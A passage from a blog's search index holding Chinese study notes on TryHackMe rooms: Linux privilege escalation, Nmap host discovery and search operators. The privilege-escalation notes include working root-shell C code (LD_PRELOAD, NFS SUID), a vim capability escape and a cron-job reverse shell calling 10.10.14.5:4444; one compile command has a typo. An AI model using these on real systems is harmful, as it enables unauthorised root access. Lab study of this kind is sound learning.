class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、输入目标域名 A</span><br><span class="line">2、计算机进行 DNS 查找，将域名解析为 IP：B</span><br><span class="line">3、生成 HTTP请求包，指定端口 80 或 443，请求包包括目标 IP B</span><br><span class="line">4、使用 ARP 查找默认网关（路由器）的 mAC：C</span><br><span class="line">5、data frame -&gt; C -&gt; B/80</span><br><span class="line">6、服务器接收请求，反向以相同方式传回响应信息</span><br></pre></td></tr></table></figure><h4 id="Section-5"><a href="#Section-5" class="headerlink" title="Section 5:"></a>Section 5:</h4>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe-LinuxPrivilegeEscalation</title>
      <link href="/2025/04/21/TryHackMe-LinuxPrivilegeEscalation/"/>
      <url>/2025/04/21/TryHackMe-LinuxPrivilegeEscalation/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中 Room: Linux Privilege Escalation 获得的知识点。ƪ(˘⌣˘)ʃ</p><span id="more"></span><!-- toc --><h2 id="权限提升概述"><a href="#权限提升概述" class="headerlink" title="权限提升概述"></a>权限提升概述</h2><p>&emsp;&emsp;权限提升即通过系统或应用程序中的漏洞，从较低权限的帐户转到较高权限的帐户</p><h2 id="通过内核漏洞提升权限"><a href="#通过内核漏洞提升权限" class="headerlink" title="通过内核漏洞提升权限"></a>通过内核漏洞提升权限</h2><p>&emsp;&emsp;<code>内核漏洞利用方法</code>：在确定当前 Linux 的的内核版本后，可以通过搜索并查找目标系统内核版本的漏洞利用代码，利用某些可行漏洞</p><p>&emsp;&emsp;<code>如何搜索现有漏洞利用代码</code>：Google 搜索；<a href="https://www.cvedetails.com/">CVEdetails.com</a>；Exploit-db 搜索；searchsploit 搜索</p><p>&emsp;&emsp;以下是做题时学到的知识点</p><p>&emsp;&emsp;<code>Linux主机之间传送文件</code>：发送方使用命令<code>python -m http.server</code>，开放端口；接收方使用<code>wget</code>指令进行下载：<code>wget http://&lt;ip of sender&gt;:8000/&lt;filename&gt;</code></p><p>&emsp;&emsp;<code>CVE-2015-1328漏洞</code>：需求 Ubuntu 内核版本 3.13 至 3.19.0-21.21；影响的 Ubuntu 版本包括 Ubuntu 12.04&#x2F;14.04&#x2F;14.10&#x2F;15.04；可实现本地非特权用户获得 root 权限，公开的漏洞利用代码在此ƪ(˘⌣˘)ʃ   &#x3D;&gt;  <a href="https://www.exploit-db.com/exploits/37292">CVE-2015-1328漏洞利用代码</a></p><h2 id="通过设置LD-PRELOAD-生成具有root权限的shell"><a href="#通过设置LD-PRELOAD-生成具有root权限的shell" class="headerlink" title="通过设置LD_PRELOAD 生成具有root权限的shell"></a>通过设置LD_PRELOAD 生成具有root权限的shell</h2><p>&emsp;&emsp;<code>前提条件</code>：非特权用户在一些程序上拥有 sudo 权限，可以以 root 权限运行该程序；sudo 权限配置允许保留 <code>LD_PRELOAD</code> 环境变量，即<code>/etc/sudoers</code> 文件中包含如下配置：<code>Defaults env_keep += LD_PRELOAD</code>；Linux 安装了 gcc，使得其可以编译并运行 C 程序</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，我们需要编写如下的 C 代码，这些代码的作用是使得进程在获取 uid 时返回 0，即 root 用户的 uid，实现提权(这里我准备了两段，第二段使用时需要在 shell.c 目录下)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一段</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第二段</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">getuid</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;第二步，使用 gcc 将 shell.c 编译为共享库，指令为<code>gcc -fPIC -shared -o shell.so shell.c [-nostartfiles]</code></p><p>&emsp;&emsp;最后，使用<code>sudo LD_PRELOAD=./shell.so &lt;命令&gt;</code>，基于此技术可以使用的命令能够通过<code>sudo -l</code>得知</p><h2 id="利用SUID文件进行权限提升"><a href="#利用SUID文件进行权限提升" class="headerlink" title="利用SUID文件进行权限提升"></a>利用SUID文件进行权限提升</h2><p>&emsp;&emsp;<code>SUID</code>：SUID 是一种特殊的文件权限设置，允许普通用户以文件所有者(也可以使用 SGID，文件所有者所在组)的身份执行该文件；如果某个可执行文件设置了 SUID 位，并且该文件的所有者是 root 用户，那么普通用户在执行该文件时，将以 root 权限运行该程序</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，通过命令<code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>找出所有被设置了 SUID 的可执行文件，观察是否有可以利用的命令</p><p>&emsp;&emsp;第二步，根据可以使用的命令，查看<code>/etc/shadow</code>和<code>/etc/passwd</code>，根据可以执行的指令，选择破解某账户的密码或新增 root 权限用户</p><p>&emsp;&emsp;<code>习题知识点</code>：如果 Linux 主机为<code>base64</code>指令设置了 SUID，则可基于此查看<code>/etc/shadow</code>和<code>/etc/passwd</code>并通过 base64 解码得到所有用户的账号及密码</p><h2 id="利用Capabilities属性进行权限提升"><a href="#利用Capabilities属性进行权限提升" class="headerlink" title="利用Capabilities属性进行权限提升"></a>利用Capabilities属性进行权限提升</h2><p>&emsp;&emsp;<code>Capabilities属性</code>：为特定二进制文件赋予的属性，在不给予非特权用户 sudo 权利的同时满足其使用该文件进行 root 权限才能办到的事</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，使用命令筛选出被设置了 Capabilities 属性的文件：<code>getcap -r / 2&gt;/dev/null</code></p><p>&emsp;&emsp;根据结果，查找提权点，并编写相应代码(可使用<a href="https://gtfobins.github.io/">GTFObins</a>辅助)使用户获取 root 权限，比如下例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span></span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/home/karen/vim = cap_setuid+ep</span><br><span class="line">/home/ubuntu/view = cap_setuid+ep</span><br><span class="line"></span><br><span class="line">=&gt; 观察到vim指令存在setuid操作有设置Capabilities，利用此，可以编写代码，使本用户 uid=0 &lt;=&gt; root</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim -c <span class="string">&#x27;:!sh&#x27;</span></span></span><br><span class="line"></span><br><span class="line">=&gt; 这会打开一个root shell，接下来就可以为所欲为了</span><br></pre></td></tr></table></figure><h2 id="修改root定时任务进行权限提升"><a href="#修改root定时任务进行权限提升" class="headerlink" title="修改root定时任务进行权限提升"></a>修改root定时任务进行权限提升</h2><p>&emsp;&emsp;<code>Cron Jobs</code>：是一种定时执行的可执行文件，默认运行权限同其任务设定的所有者相同；所有的这类可执行文件的配置被存于<code>/etc/crontab</code>文件中，该文件可被所有人读取</p><p>&emsp;&emsp;<code>具体流程</code></p><p>&emsp;&emsp;第一步，使用可以使用的查看命令，查看<code>/etc/crontab</code></p><p>&emsp;&emsp;第二步，找到可以利用的提权点；比如，由 root 用户设置的，定时执行某可执行文件的指令，而目标文件可被非特权用户改写或被删除</p><p>&emsp;&emsp;最后，基于上述条件，对指定的文件进行改写，比如通过使用如下 shell，可实现攻击机对受害机以 root 权限实施的操控</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 受害机</span><br><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; /home/karen/backup.sh</span><br><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&#x27; &gt;&gt; /home/karen/backup.sh</span><br><span class="line">chmod +x /home/karen/backup.sh</span><br><span class="line"></span><br><span class="line">=&gt; 攻击机</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><h2 id="利用PATH环境变量进行权限提升"><a href="#利用PATH环境变量进行权限提升" class="headerlink" title="利用PATH环境变量进行权限提升"></a>利用PATH环境变量进行权限提升</h2><p>&emsp;&emsp;<code>PATH</code>：Linux中的环境变量设置，对于未内置于 shell 中或未使用绝对路径定义的任何命令，Linux 将在 PATH 下定义的文件夹中进行搜索</p><p>&emsp;&emsp;<code>具体步骤</code>：如下表依次进行</p><table><thead><tr><th>步骤</th><th>描述</th></tr></thead><tbody><tr><td>查找可写目录</td><td>&#96;find &#x2F; -type d -writable 2&gt;&#x2F;dev&#x2F;null</td></tr><tr><td>检查 PATH</td><td><code>echo $PATH</code></td></tr><tr><td>添加可控目录到 PATH</td><td><code>export PATH=/tmp:$PATH</code></td></tr><tr><td>放置恶意二进制</td><td><code>/tmp/thm</code></td></tr><tr><td>执行目标脚本或程序</td><td>执行含未使用绝对路径调用命令的 SUID 程序</td></tr><tr><td>提权成功</td><td>获取 root shell 或读取敏感文件</td></tr></tbody></table><h2 id="利用NFS进行权限提升"><a href="#利用NFS进行权限提升" class="headerlink" title="利用NFS进行权限提升"></a>利用NFS进行权限提升</h2><p>&emsp;&emsp;<code>NFS</code>：是一种网络文件系统协议，允许用户通过网络访问远程主机上的文件，其配置保存于<code>/etc/exports</code>文件中</p><p>&emsp;&emsp;<code>NFS的工作原理</code>：对服务器端，需配置并导出某个目录供客户端挂载；对客户端，将远程目录挂载到客户端某个目录，然后就可以像访问本地文件一样访问远程数据</p><p>&emsp;&emsp;<code>NFS配置记录解读</code>：以下直接使用 ChatGPT 4o 给出的回复，<code>&lt;共享目录路径&gt; &lt;允许IP&gt;(&lt;选项1&gt;,&lt;选项2&gt;,...)</code></p><h4 id="📌-客户端标识方式（前缀部分）"><a href="#📌-客户端标识方式（前缀部分）" class="headerlink" title="📌 客户端标识方式（前缀部分）"></a>📌 客户端标识方式（前缀部分）</h4><p>&emsp;&emsp;你可以指定哪些客户端有权限访问，比如：</p><table><thead><tr><th>客户端标识</th><th>含义</th></tr></thead><tbody><tr><td><code>*</code></td><td>所有主机（不安全）</td></tr><tr><td><code>192.168.1.100</code></td><td>指定某个 IP</td></tr><tr><td><code>192.168.1.0/24</code></td><td>指定一个子网</td></tr><tr><td><code>client.example.com</code></td><td>通过主机名识别</td></tr></tbody></table><hr><h4 id="🧩-常用选项说明（括号内的部分）"><a href="#🧩-常用选项说明（括号内的部分）" class="headerlink" title="🧩 常用选项说明（括号内的部分）"></a>🧩 常用选项说明（括号内的部分）</h4><h5 id="📖-读写权限控制"><a href="#📖-读写权限控制" class="headerlink" title="📖 读写权限控制"></a>📖 读写权限控制</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>ro</code></td><td>只读权限（Read Only）</td></tr><tr><td><code>rw</code></td><td>读写权限（Read and Write）</td></tr></tbody></table><blockquote><p>🚨 通常为了安全，建议尽量使用 <code>ro</code>，除非真的需要写权限。</p></blockquote><hr><h5 id="🧍-用户权限映射（身份映射）"><a href="#🧍-用户权限映射（身份映射）" class="headerlink" title="🧍 用户权限映射（身份映射）"></a>🧍 用户权限映射（身份映射）</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>root_squash</code></td><td>把客户端的 root 映射为低权限用户（默认行为）</td></tr><tr><td><code>no_root_squash</code></td><td>客户端的 root 保持 root 身份（⚠️ 极高危）</td></tr><tr><td><code>all_squash</code></td><td>把<strong>所有用户</strong>都映射成匿名用户（适合匿名只读共享）</td></tr><tr><td><code>anonuid=UID</code></td><td>设置匿名用户的 UID（配合 squash）</td></tr><tr><td><code>anongid=GID</code></td><td>设置匿名用户的 GID</td></tr></tbody></table><blockquote><p>✅ <code>root_squash</code> 是默认也是推荐的，<code>no_root_squash</code> 是危险操作，应避免使用。</p></blockquote><hr><h5 id="💾-同步与性能选项"><a href="#💾-同步与性能选项" class="headerlink" title="💾 同步与性能选项"></a>💾 同步与性能选项</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>sync</code></td><td>所有数据操作同步写入磁盘后才响应，数据更安全（推荐）</td></tr><tr><td><code>async</code></td><td>提前响应写入请求，性能更好但数据可能丢失（不推荐）</td></tr></tbody></table><hr><h5 id="📁-子目录检查"><a href="#📁-子目录检查" class="headerlink" title="📁 子目录检查"></a>📁 子目录检查</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>subtree_check</code></td><td>检查子目录权限是否符合导出要求（默认，稍慢）</td></tr><tr><td><code>no_subtree_check</code></td><td>不做子目录权限检查（性能更好，推荐）</td></tr></tbody></table><hr><h5 id="💡-其他高级选项（可选）"><a href="#💡-其他高级选项（可选）" class="headerlink" title="💡 其他高级选项（可选）"></a>💡 其他高级选项（可选）</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>insecure</code></td><td>允许客户端使用 1024 以上的非特权端口连接（不推荐）</td></tr><tr><td><code>secure</code></td><td>只接受客户端从特权端口发起的请求（默认）</td></tr><tr><td><code>nohide</code></td><td>允许客户端查看挂载在共享目录下的其他文件系统</td></tr><tr><td><code>crossmnt</code></td><td>允许跨挂载点共享子目录</td></tr><tr><td><code>fsid=0</code> 或 <code>fsid=root</code></td><td>指定 NFSv4 的“根目录”，必须设置一个共享目录为根</td></tr></tbody></table><p>&emsp;&emsp;<code>提权点所在</code>：NFS 默认会启用属性<code>root_squash</code>，把客户端上的 root 用户映射成一个低权限用户（通常是 <code>nfsnobody</code>），从而避免远程 root 用户在 NFS 服务器上获得特权</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，在攻击机上查看目的机中可以挂载的共享文件夹，使用指令<code>showmount -e 目的机IP</code></p><p>&emsp;&emsp;第二步，在目的机中使用非特权用户读取<code>/etc/exports</code>，重点查看其中设置 no_root_squash 的文件夹</p><p>&emsp;&emsp;第三步，将选定的文件夹挂载到攻击机，使用指令<code>mount -o rw 目的机IP:所选文件夹路径 攻击机挂载路径</code></p><p>&emsp;&emsp;第四步，在攻击机挂载路径下创建脚本，内容可如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nfs.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;编译后，为该文件设置 SUID 属性，随后运行即可获取目的机 root 权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc nfs.c -0 nfs -w</span><br><span class="line">chmod  +s nfs</span><br><span class="line"></span><br><span class="line">=&gt; 目的机进行</span><br><span class="line">./nfs</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TryHackMe Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe-NmapLiveHostDiscovery</title>
      <link href="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/"/>
      <url>/2025/04/20/TryHackMe-NmapLiveHostDiscovery/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中 Room: Nmap Live Host Discovery 获得的知识点。ƪ(˘⌣˘)ʃ</p><span id="more"></span><!-- toc --><h2 id="网段、子网与子网掩码"><a href="#网段、子网与子网掩码" class="headerlink" title="网段、子网与子网掩码"></a>网段、子网与子网掩码</h2><p>&emsp;&emsp;<code>网段</code>：一个网段由一个网络地址和一个子网掩码组成；网段的主要作用是将IP地址空间划分成多个小块，分配给多个链接同一路由的主机；网段将其管理的多个主机打包，以便他们在网络中作为一个整体进行管理，以下是网段的分类</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/%E7%BD%91%E6%AE%B5%E5%88%86%E7%B1%BB.png" title="网段分类"></p><p>&emsp;&emsp;<code>子网</code>：子网是对网段的细分，如果是做一次类比，网段就好比电脑的 1TB 存储空间，而子网就等同于对这一大块硬盘分为 C&#x2F;D&#x2F;E 区</p><p>&emsp;&emsp;<code>子网掩码</code>：子网掩码通过和精确的 IP 作用，找到其链接的网段或子网，其工作原理及示例展示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 比如我现在拥有C类网段 192.168.1.0 =&gt; 共可管理256个IP</span><br><span class="line">1、不使用子网划分，即子网为网段本事：192.168.1.0/24</span><br><span class="line">   /x：该子网的子网掩码为 111……11(x位)000……00(32-x)</span><br><span class="line">2、使用子网划分，比如分为：192.168.1.0/25、192.168.1.128/25</span><br><span class="line">   192.168.1.0/25 =&gt; 192.168.1.0~192.168.1.127</span><br><span class="line">   192.168.1.128/25 =&gt; 192.168.1.128~192.168.1.255</span><br><span class="line"># 子网掩码的工作原理：子网掩码与IP地址进行按位“与”运算，得到子网地址</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;显然，越大的网段，比如 10.1.0.0 这类，其可分配的 IP 也更多(10.1.0.0~10.1.255.255)，此时子网可写为 10.1.0.0&#x2F;16</p><h2 id="ARP查询"><a href="#ARP查询" class="headerlink" title="ARP查询"></a>ARP查询</h2><p>&emsp;&emsp;<code>ARP简介</code>：又称“地址解析协议”，利用该协议，可以获取同一子网主机的硬件地址(MAC)；需注意的是，<font color="red">ARP查询数据包仅会在链接同一交换机(数据链路层设备)的主机中通信，并不能被路由，无法跨越至其他网络</font></p><p>&emsp;&emsp;<code>MAC地址</code>：MAC 地址用于局域网内设备之间的通信。当一个设备想要与另一个设备通信时，它会使用目标设备的 MAC 地址来标识目标；它是一个唯一的标识符，通常与网卡绑定，每个网络设备在出厂时都会被分配一个唯一的 MAC 地址</p><p>&emsp;&emsp;<code>ARP查询流程</code>：ARP 查询的流程如下，假设使用主机 computer_A，交换机 Switch 记录的 MAC 地址表如下</p><table><thead><tr><th align="center">主机名</th><th align="center">MAC地址</th></tr></thead><tbody><tr><td align="center">computer_A</td><td align="center">00:14:22:01:23:45</td></tr><tr><td align="center">computer_B</td><td align="center">00:14:22:01:23:46</td></tr><tr><td align="center">computer_C</td><td align="center">00:14:22:01:23:47</td></tr><tr><td align="center">computer_D</td><td align="center">00:14:22:01:23:48</td></tr></tbody></table><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/ARP%E6%9F%A5%E8%AF%A2%E6%B5%81%E7%A8%8B.png" title="ARP查询流程"></p><h2 id="Nmap扫描指定"><a href="#Nmap扫描指定" class="headerlink" title="Nmap扫描指定"></a>Nmap扫描指定</h2><p>&emsp;&emsp;<code>指定扫描IP的四种方式</code>：列表、范围、子网和文件，展示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list：MACHINE_IP scanme.nmap.org example.com  =&gt;  扫描3个IP</span><br><span class="line">range：10.11.12.15-20  =&gt;  扫描6个IP</span><br><span class="line">subnet：MACHINE_IP/30  =&gt;  扫描4个IP</span><br><span class="line">file：将扫描的IP以列表形式存储为.txt文件，需使用 nmap -iL filename</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>附加项的作用</code>：列举提到的两项如下</p><table><thead><tr><th align="center">附件选项</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><code>nmap -sL 扫描IP</code></td><td align="center">输出将扫描的主机的详细列表</td></tr><tr><td align="center"><code>nmap -n 扫描IP</code></td><td align="center">不对 IP 进行反向 DNS 解析，这导致无法通过 IP 获得主机名</td></tr></tbody></table><h2 id="TCP-IP层协议解析"><a href="#TCP-IP层协议解析" class="headerlink" title="TCP&#x2F;IP层协议解析"></a>TCP&#x2F;IP层协议解析</h2><p>&emsp;&emsp;一图流如下</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/TCP-IP%E5%B1%82.png" title="TCP-IP层"></p><p>&emsp;&emsp;<code>扫描所需协议</code>：ARP，同一子网下存活主机扫描；ICMP，进行 ping 操作(可跨越路由操作)；TCP&#x2F;UDP，将特制的数据包发送到常见的 TCP 或 UDP 端口，以检查目标是否会响应</p><h2 id="使用ARP进行Nmap扫描"><a href="#使用ARP进行Nmap扫描" class="headerlink" title="使用ARP进行Nmap扫描"></a>使用ARP进行Nmap扫描</h2><p>&emsp;&emsp;<code>使用条件</code>：可使用 sudo 指令，目标与本机处于同一子网中，无需目标在线</p><p>&emsp;&emsp;<code>使用语法</code>：sudo nmap -PR -sn MACHINE_IP&#x2F;24</p><p>&emsp;&emsp;<code>示例扫描结果</code>：如下图所示</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/%E7%A4%BA%E4%BE%8B%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="示例扫描结果"></p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/ARP%E6%89%AB%E6%8F%8F.png" title="ARP扫描"></p><p>&emsp;&emsp;<code>一个专用ARP查询的扫描器</code>：称<code>arp-scan</code>，使用指令<code>apt install arp-scan</code>下载，一般使用<code>arp-scan -l</code>，即扫描本地子网上所有有效 IP</p><h2 id="使用ICMP进行Nmap扫描"><a href="#使用ICMP进行Nmap扫描" class="headerlink" title="使用ICMP进行Nmap扫描"></a>使用ICMP进行Nmap扫描</h2><p>&emsp;&emsp;<code>使用条件</code>：可使用 sudo 指令，需目标在线，即需目标对 ping 请求进行回复</p><p>&emsp;&emsp;<code>使用语法</code>：sudo nmap -PE&#x2F;-PP&#x2F;-PM -sn 扫描IP，<code>-sn</code>表示无需扫描端口</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/ICMP%E6%89%AB%E6%8F%8F.png" title="ICMP扫描"></p><h2 id="使用TCP和UDP进行Nmap扫描"><a href="#使用TCP和UDP进行Nmap扫描" class="headerlink" title="使用TCP和UDP进行Nmap扫描"></a>使用TCP和UDP进行Nmap扫描</h2><p>&emsp;&emsp;<code>使用语法</code>：sudo nmap -PS&#x2F;-PA&#x2F;PU[端口号] -sn 扫描IP，端口号默认为 80 端口</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/TCP%E6%89%AB%E6%8F%8F.png" title="TCP扫描"></p><p>&emsp;&emsp;<code>一个专用TCP/UDP查询的扫描器</code>：称<code>masscan</code>，使用指令<code>apt install masscan</code>下载，使用语法<code>masscan 扫描网段 -p端口</code></p><h2 id="总结-当搬运工了"><a href="#总结-当搬运工了" class="headerlink" title="总结(当搬运工了)"></a>总结(当搬运工了)</h2><table><thead><tr><th align="center">扫描类型</th><th align="center">示例命令</th></tr></thead><tbody><tr><td align="center">ARP Scan ARP （ARP）扫描</td><td align="center"><code>sudo nmap -PR -sn MACHINE_IP/24</code></td></tr><tr><td align="center">ICMP Echo Scan ICMP 回声扫描</td><td align="center"><code>sudo nmap -PE -sn MACHINE_IP/24</code></td></tr><tr><td align="center">ICMP Timestamp Scan ICMP 时间戳扫描</td><td align="center"><code>sudo nmap -PP -sn MACHINE_IP/24</code></td></tr><tr><td align="center">ICMP Address Mask Scan ICMP 地址掩码扫描</td><td align="center"><code>sudo nmap -PM -sn MACHINE_IP/24</code></td></tr><tr><td align="center">TCP SYN Ping Scan TCP 协议 SYN Ping 扫描</td><td align="center"><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td align="center">TCP ACK Ping Scan TCP 协议 ACK Ping 扫描</td><td align="center"><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td align="center">UDP Ping Scan UDP 协议 Ping 扫描</td><td align="center"><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td></tr></tbody></table><table><thead><tr><th align="center">选择</th><th align="center">目的</th></tr></thead><tbody><tr><td align="center"><code>-n</code></td><td align="center">无 DNS 查找</td></tr><tr><td align="center"><code>-R</code></td><td align="center">所有主机的反向 DNS 查找</td></tr><tr><td align="center"><code>-sn</code></td><td align="center">仅主机发现</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TryHackMe Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe-杂项</title>
      <link href="/2025/04/19/TryHackMe-%E6%9D%82%E9%A1%B9/"/>
      <url>/2025/04/19/TryHackMe-%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中，一些细碎而有用的知识点。ƪ(˘⌣˘)ʃ</p><span id="more"></span><!-- toc --><h2 id="Search-Skills"><a href="#Search-Skills" class="headerlink" title="Search Skills"></a>Search Skills</h2><p>&emsp;&emsp;<code>Google支持的搜索运算符</code>：以下展示四个常用搜索运算符的作用并提供一定示例</p><table><thead><tr><th align="center">搜索运算符</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><code>&quot;exact phrase&quot;</code></td><td align="center">返回包含确切单词或短语的页面</td></tr><tr><td align="center"><code>site:</code></td><td align="center">指定要将搜索限制到的域名</td></tr><tr><td align="center"><code>-</code></td><td align="center">省略包含特定单词或短语的搜索结果</td></tr><tr><td align="center"><code>filetype:</code></td><td align="center">查找指定类型的文件</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># “exact phrase”</span></span><br><span class="line">|“civil procedural law”|  =&gt;  返回包含该短语的网页</span><br><span class="line"><span class="comment"># site:</span></span><br><span class="line">|site:gov.cn sichuan|  =&gt;  返回域名为 gov.cn 且同四川相联系的网页</span><br><span class="line"><span class="comment"># -</span></span><br><span class="line">|-dafabet soccer|  =&gt;  返回有关足球而不包含足球博彩的网页</span><br><span class="line"><span class="comment"># filetype</span></span><br><span class="line">|filetype:pdf report|  =&gt;  返回文件类型为 PDF 的报告</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TryHackMe Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言学习笔记</title>
      <link href="/2024/11/11/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
